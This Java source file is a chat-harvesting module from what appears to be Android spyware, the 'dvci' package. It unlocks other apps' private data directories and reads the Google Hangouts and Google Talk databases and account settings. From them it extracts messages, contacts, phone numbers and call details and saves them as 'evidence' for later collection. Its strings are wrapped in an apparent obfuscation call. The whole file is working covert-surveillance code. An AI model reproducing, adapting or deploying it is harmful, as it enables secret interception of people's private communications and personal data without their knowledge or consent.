package com.android.dvci.module.chat;

import android.database.Cursor;
import android.util.Log;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.file.Path;
import com.android.dvci.manager.ManagerModule;
import com.android.dvci.module.ModuleAddressBook;
import com.android.dvci.module.call.CallInfo;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public class ChatGoogle extends SubModuleChat {

	private static final String TAG = "ChatGoogle";

	private static final int PROGRAM = 0x04;

	String pObserving = M.e("com.google.android.talk");

	private Semaphore readBabelSemaphore = new Semaphore(1);
	private static String phone=null;

	public static String getPhone() {
		if(phone==null){
			phone=ChatGoogle.readMyPhoneNumber();
		}
		return phone;
	}

	@Override
	int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}
		readChatMessages();
	}

	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 *
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		phone = readMyPhoneNumber();
		//getCurrentCall(new CallInfo(false));
		readChatMessages();
	}


	private void readChatMessages() {

		if (!readBabelSemaphore.tryAcquire()) {
			return;
		}

		try {
			long[] lastLines = markup.unserialize(new long[2]);

			String babel0 = M.e("babel0.db");
			String babel1 = M.e("babel1.db");

			String account = readAccountsXml("1.name", "string",null);
			if (account != null) {
				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account);
			}
			if (StringUtils.isEmpty(account) || !readHangoutMessages(lastLines, babel1, account)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) try babel0");
				}
				account = readAccountsXml("0.name", "string",null);
				if (account != null) {
					ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account);
				}
				readHangoutMessages(lastLines, babel0, account);
			}
			readGoogleTalkMessages(lastLines);

			serializeMarkup(lastLines);
		} finally {
			readBabelSemaphore.release();
		}
	}

	private void serializeMarkup(long[] lastLines) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages): updating markup");
		}
		try {
			markup.writeMarkupSerializable(lastLines);
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatWeChatMessages) Error: " + e);
			}
		}
	}

	private boolean readHangoutMessages(long[] lastLines, String dbFile, String account) {

		String dbDir = M.e("/data/data/com.google.android.talk/databases");


		//if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
		//	saveContacts(helper);
		//}

		String sql_c = M.e("select cp.conversation_id, latest_message_timestamp, full_name, latest_message_timestamp from conversations as c ") +
				M.e("join conversation_participants as cp on c.conversation_id=cp.conversation_id join participants as p on  cp.participant_row_id=p._id");

		// babel
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		if (helper == null) {
			return false;
		}

		try {
			ChatGroups groups = new ChatGroups();

			long newHangoutReadDate = 0;
			List<HangoutConversation> conversations = getHangoutConversations(helper, account, lastLines[1]);
			for (HangoutConversation sc : conversations) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readHangoutMessages) conversation: " + sc.id + " date: " + sc.date);
				}

				// retrieves the lastConvId recorded as evidence for this
				// conversation
				if (sc.isGroup() && !groups.hasMemoizedGroup(sc.id)) {
					fetchHangoutParticipants(helper, account, sc.id, groups);
					//groups.addPeerToGroup(sc.id, account);
				}

				long lastReadId = fetchHangoutMessages(helper, sc, groups, lastLines[1]);
				newHangoutReadDate = Math.max(newHangoutReadDate, lastReadId);

			}
			if (newHangoutReadDate > 0) {
				lastLines[1] = newHangoutReadDate;
			}
		} finally {
			helper.disposeDb();
		}
		return true;
	}

	private long fetchHangoutMessages(GenericSqliteHelper helper, final HangoutConversation conversation, final ChatGroups groups, long lastTimestamp) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String sql_m = String.format(M.e("select m._id, full_name, fallback_name ,text, timestamp, type, p.chat_id ") +
						M.e("from messages as m join participants as p on m.author_chat_id = p.chat_id where type<3 and conversation_id='%s' and timestamp>%s"),
				conversation.id, lastTimestamp);

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				// I read a line in a conversation.
				int id = cursor.getInt(0);
				String fullName = cursor.getString(1);
				String fallback_name = cursor.getString(2);
				String body = cursor.getString(3);
				long timestamp = cursor.getLong(4);

				boolean incoming = cursor.getInt(5) == 2;
				String chat_id = cursor.getString(6);

				String peer = fullName;
				//if (fallback_name!=null)
				//	peer = fallback_name;

				// localtime or gmt? should be converted to gmt
				Date date = new Date(timestamp / 1000);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp + " incoming: "
							+ incoming);
				}

				boolean isGroup = conversation.isGroup();

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
				}

				String from, to = null;
				String fromDisplay, toDisplay = null;

				from = incoming ? peer : conversation.account;
				fromDisplay = incoming ? peer : conversation.account;

				Contact contact = groups.getContact(peer);

				if (isGroup) {
					// if (peer.equals("0")) {
					// peer = conversation.account;
					// }
					to = groups.getGroupToName(from, conversation.id);
					toDisplay = to;
				} else {
					to = incoming ? conversation.account : conversation.remote;
					toDisplay = incoming ? conversation.account : conversation.remote;
				}

				if (!StringUtils.isEmpty(body)) {
					MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
							body, incoming);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) message: " + message.from + " "
								+ (message.incoming ? "<-" : "->") + " " + message.to + " : " + message.body);
					}
					messages.add(message);
				}

				return timestamp;
			}
		};

		long newLastId = helper.traverseRawQuery(sql_m, new String[]{}, visitor);

		if (messages != null && messages.size() > 0) {
			saveEvidence(messages);
		}

		return newLastId;
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

	private void fetchHangoutParticipants(GenericSqliteHelper helper, final String account, final String thread_id, final ChatGroups groups) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchHangoutParticipants) : " + thread_id);
		}

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				String id = cursor.getString(0);
				String fullname = cursor.getString(1);
				String fallback = cursor.getString(2);

				Contact contact;

				String email = fullname;
				if (email == null)
					return 0;

				contact = new Contact(id, email, fullname, "");

				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchParticipants) %s", contact);
				}

				if (email != null) {
					groups.addPeerToGroup(thread_id, contact);
				}
				return 0;
			}
		};

		String sqlquery = M.e("select  p.chat_id, full_name, fallback_name, cp.conversation_id from conversation_participants as cp join participants as p on  cp.participant_row_id=p._id where conversation_id=?");
		helper.traverseRawQuery(sqlquery, new String[]{thread_id}, visitor);
	}

	private List<HangoutConversation> getHangoutConversations(GenericSqliteHelper helper, final String account, long timestamp) {
		final List<HangoutConversation> conversations = new ArrayList<HangoutConversation>();

		String[] projection = new String[]{M.e("conversation_id"), M.e("latest_message_timestamp"), M.e("conversation_type"), M.e("generated_name")};
		String selection = "latest_message_timestamp > " + timestamp;

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				HangoutConversation c = new HangoutConversation();
				c.account = account;

				c.id = cursor.getString(0);
				c.date = cursor.getLong(1);
				c.group = cursor.getInt(2) == 2;
				c.remote = cursor.getString(3);

				c.group = true;
				conversations.add(c);
				return 0;
			}
		};

		helper.traverseRecords(M.e("conversations"), visitor);

		return conversations;

	}
	static public ArrayList<String> readAccountsXmlSets(String nameField,String type) {
		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
		String xmlFile = M.e("accounts.xml");
		Path.unprotect(xmlDir, xmlFile, true);

		/* example
		<set name="1.phone_verification">
		<string>+393349115140,false,true,1,false</string>
		<string>+393346405249,false,true,1,false</string>
		</set>
		*/

		DocumentBuilder builder;
		ArrayList<String> values = new ArrayList<String>();
		try {
			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document doc = builder.parse(new File(xmlDir, xmlFile));
			NodeList defaults = doc.getElementsByTagName("set");
			for (int i = 0; i < defaults.getLength(); i++) {
				Node d = defaults.item(i);
				NamedNodeMap attributes = d.getAttributes();
				Node attr = attributes.getNamedItem("name");
				// nameField = "0.name"
				if ( attr!=null && nameField.equals(attr.getNodeValue())) {
					int nNode = d.getChildNodes().getLength();
					for ( int c=0 ; c < nNode; c++ ) {
						Node n = d.getChildNodes().item(c);
						String localName = n.getNodeName();
						if(localName != null && type.contentEquals(localName)) {
							String s =n.getTextContent();
							values.add(s);
						}
					}
					break;
				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readAccountsXml) Error: " + e);
			}
		}
		return values;
	}
	static public String readAccountsXml(String nameField, String type,String attribute) {
		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
		String xmlFile = M.e("accounts.xml");

		Path.unprotect(xmlDir, xmlFile, true);

		DocumentBuilder builder;
		String value = null;
		try {
			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document doc = builder.parse(new File(xmlDir, xmlFile));
			NodeList defaults = doc.getElementsByTagName(type);
			for (int i = 0; i < defaults.getLength(); i++) {
				Node d = defaults.item(i);
				NamedNodeMap attributes = d.getAttributes();
				Node attr = attributes.getNamedItem("name");
				// nameField = "0.name"
				if ( attr!=null && nameField.equals(attr.getNodeValue())) {
					if( attribute == null) {
						Node child = d.getFirstChild();
						value = child.getNodeValue();
					}else{
						if(attributes.getNamedItem(attribute)!=null){
							value = attributes.getNamedItem(attribute).getNodeValue();
						}
					}
					break;
				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readAccountsXml) Error: " + e);
			}
		}
		return value;
	}

	private void readGoogleTalkMessages(long[] lastLines) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		try {
			String dbFile = M.e("talk.db");
			String dbDir = M.e("/data/data/com.google.android.gsf/databases");

			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);

			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
				return;
			}

			try {
				setMyAccount(helper);

				// Save contacts if AddressBook is active
				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
					saveContacts(helper);
				}

				long newLastLine = fetchGTalkMessages(helper, lastLines[0]);
				lastLines[0] = newLastLine;

			} finally {
				helper.disposeDb();
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatWeChatMessages) Error: ", ex);
			}
		}
	}

	private long fetchGTalkMessages(GenericSqliteHelper helper, long lastLine) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String sqlquery = M.e("select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?");
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				long createTime = cursor.getLong(0);
				// localtime or gmt? should be converted to gmt
				Date date = new Date(createTime);
				String account = cursor.getString(1);
				int isSend = cursor.getInt(2);
				boolean incoming = isSend == 1;
				String content = cursor.getString(3);
				String co_username = cursor.getString(4);
				String co_nick = cursor.getString(5);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s] %s %s %s: %s ", date, account, (incoming ? "<-" : "->"), co_nick,
							content);
				}
				String from_id, from_display, to_id, to_display;

				if (co_nick == null || co_nick.startsWith(M.e("private-chat"))) {
					return 0;
				}

				if (incoming) {
					from_id = co_username;
					from_display = co_nick;
					to_id = account;
					to_display = account;
				} else {
					from_id = account;
					from_display = account;
					to_id = co_username;
					to_display = co_nick;
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) %s -> %s", from_id, to_id);
				}
				MessageChat message = new MessageChat(PROGRAM, date, from_id, from_display, to_id, to_display, content,
						incoming);
				messages.add(message);

				return createTime;
			}
		};
		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastLine)}, visitor);

		getModule().saveEvidence(messages);

		return lastCreationLine;
	}

	private void setMyAccount(GenericSqliteHelper helper) {
		String[] projection = new String[]{"_id", "name", "username"};
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String name = cursor.getString(1);
				String username = cursor.getString(2);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (setMyAccount) %s, %s", name, username);
				}

				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, name);

				return id;
			}
		};

		long ret = helper.traverseRecords("accounts", visitor);

	}

	private void saveContacts(GenericSqliteHelper helper) {
		String[] projection = new String[]{"username", "nickname"};

		boolean tosave = false;
		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {

			@Override
			public long cursor(Cursor cursor) {

				String username = cursor.getString(0);
				String nick = cursor.getString(1);

				Contact c = new Contact(username, username, nick, "");
				if (username != null && !username.endsWith(M.e("public.talk.google.com"))) {
					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.GOOGLE, c)) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (cursor) need to serialize");
						}
						return 1;
					}
				}
				return 0;
			}
		};

		if (helper.traverseRecords(M.e("contacts"), visitor) == 1) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveContacts) serialize");
			}
			ModuleAddressBook.getInstance().serializeContacts();
		}
	}

	public static String readMyPhoneNumber() {
		String phone = "";
		String activeAccount = getActiveAccount();
		if(activeAccount != null) {
			ArrayList<String> res = readAccountsXmlSets(activeAccount+M.e(".phone_verification"),M.e("string"));
			if( res!= null && !res.isEmpty()){
				for(String s: res){
					if(s.split(",").length >1){
						phone += s.split(",")[0]+";";
					}
				}
				if(Cfg.DEBUG) {
					Log.d(TAG, " (readMyPhoneNumber): phone numbers are : " + phone);
				}
			}else{
				/* use the account_name
				<string name="3.display_name">samsung s3mini</string>
				<string name="3.account_name">samsungs3minitest1@gmail.com</string>
				*/
				phone = readAccountsXml(activeAccount+".account_name",M.e("string"),null);
			}
		}
		return phone;
	}
	public static String getActiveAccount() {
		// recover the active account at the moment of the call:
		String active = readAccountsXml(M.e("active"),M.e("int"),"value");
		try{
			if(Cfg.DEBUG) {
				Log.d(TAG, " (getActiveAccount): active account is: " + active);
			}
			//check value integrity.
			int n = Integer.parseInt(active);
		}catch (Exception e){
			if(Cfg.DEBUG) {
				Log.d(TAG, " (getActiveAccount): ERROR converting int " + active, e);
			}
			active = null;
		}
		return active;
	}
	public static String getActiveDb() {
		String dbFile = null;
		String active = getActiveAccount();
		if( active!= null) {
			dbFile = M.e("babel") + active + ".db";
		}
		return dbFile;
	}
	/**
	 * Searches all the participant inside the passed string, which is a pipe separated patricipant list
	 *
	 * @param helper open db helper
	 * @param participants list
	 * @return returns a LinkedHashMap of GtalkEntity, where the key is the id found in the participants table
	 * id == 1 is the actual account of the owner
	 */

	public static LinkedHashMap<Integer, GtalkEntity> getParticipants(GenericSqliteHelper helper, String participants) {
		final LinkedHashMap<Integer, GtalkEntity> _res = new LinkedHashMap<Integer, GtalkEntity>();
		String filter = "";
		if (helper == null || participants == null || participants.contentEquals("") ) {
			if(Cfg.DEBUG) {
				Log.d(TAG, " (getCurrentCall): ERROR invalid parameters");
			}
			return _res;
		}

		String sqlquery = M.e("select _id,full_name,first_name,phone_id,gaia_id from participants where _id = 1");
		String[] p;
		if(participants.contains("|")){
			p = participants.split("\\|");
		}else{
			p = new String[]{participants};
		}

		for(String id : p){

			try{
				Integer.parseInt(id);
				sqlquery += M.e(" or _id = ")+id;
			}catch (Exception x){
				if(Cfg.DEBUG) {
					Log.d(TAG, " (getCurrentCall): ERROR converting int " + id);
				}
			}
		}
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String name = cursor.getString(1);
				String gtalk_id = cursor.getString(4);
				_res.put(id,new GtalkEntity(gtalk_id,id,name));
				return id;
			}
		};
		try {
			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
		}finally {
			helper.disposeDb();
		}
		LinkedHashMap<Integer, GtalkEntity> res = new LinkedHashMap<Integer, GtalkEntity>();
			for (String id : p) {
				try {
					res.put(Integer.parseInt(id),_res.get(Integer.parseInt(id)));
				}catch (Exception e){
					if(Cfg.DEBUG) {
						Log.d(TAG, " (getCurrentCall): ERROR converting int " + id);
					}
				}
			}

		return res;
	}

	public static boolean getCurrentCall(final CallInfo callInfo) {
		String dbDir = M.e("/data/data/com.google.android.talk/databases");
		String dbFile = getActiveDb();
		String sqlquery = M.e("select m.timestamp, m.author_chat_id, m.participant_keys, m.type from messages as m where m.type = 8 and m.timestamp not null order by m.timestamp desc limit 1");
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				long createTime = cursor.getLong(0);
				callInfo.account = cursor.getString(1);
				callInfo.timestamp = new Date(createTime);
				if(Cfg.DEBUG) {
					Log.d(TAG, " (getCurrentCall): timestamp=" + createTime);
				}
				callInfo.valid = true;
				callInfo.peer = cursor.getString(2);
				return createTime;
			}
		};
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		if (helper == null) {
			return false;
		}

		try {
			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
			if(callInfo.valid){
				LinkedHashMap<Integer,GtalkEntity> peers = getParticipants(helper, callInfo.peer);
				if (peers.size() > 1) {
				callInfo.peer = "";
				for(int p : peers.keySet()){
					if(p!=1){
						callInfo.peer += peers.get(p).displayName+",";
					}else{
						if (peers.get(p).gtalk_id.contentEquals(callInfo.account)) {
							callInfo.incoming = false;
						} else {
							callInfo.incoming = true;
						}
					}
				}
				} else {
					callInfo.valid = false;
				}
			}
		}finally {
			helper.disposeDb();
		}

		return callInfo.valid;
	}

	private static class GtalkEntity {
		public String gtalk_id;
		public int _id;
		public String displayName;

		private GtalkEntity(String gtalk_id, int _id, String displayName) {
			this.gtalk_id = gtalk_id;
			this._id = _id;
			this.displayName = displayName;
		}
	}
}
